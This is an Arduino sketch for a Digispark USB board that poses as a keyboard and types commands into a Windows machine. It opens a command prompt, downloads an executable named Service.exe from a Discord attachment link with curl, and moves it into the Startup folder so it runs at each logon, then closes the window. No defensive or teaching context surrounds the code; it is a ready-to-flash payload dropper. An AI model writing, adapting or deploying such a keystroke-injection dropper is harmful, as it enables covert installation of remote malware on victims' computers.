#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  
    digitalWrite(1, HIGH);

    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);

    DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
    DigiKeyboard.delay(300);
    
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(100);
    
    DigiKeyboard.println("cmd");
    DigiKeyboard.sendKeyPress(KEY_ENTER);
    DigiKeyboard.delay(300);

    DigiKeyboard.println("curl -o Service.exe https://cdn.discordapp.com/attachments/841649907365838871/1054104174771589120/Service.exe");
    DigiKeyboard.sendKeyPress(KEY_ENTER);
    DigiKeyboard.delay(300);
    
    DigiKeyboard.println("move '%USERPROFILE%\Service.exe' '%AppData%\Microsoft\Windows\Start Menu\Programs\Startup'");
    DigiKeyboard.sendKeyPress(KEY_ENTER);

    DigiKeyboard.delay(300);

    DigiKeyboard.sendKeyPress(MOD_ALT_LEFT, KEY_F4);
    DigiKeyboard.delay(300);
    
    digitalWrite(1, LOW);
    
    exit(0);

}
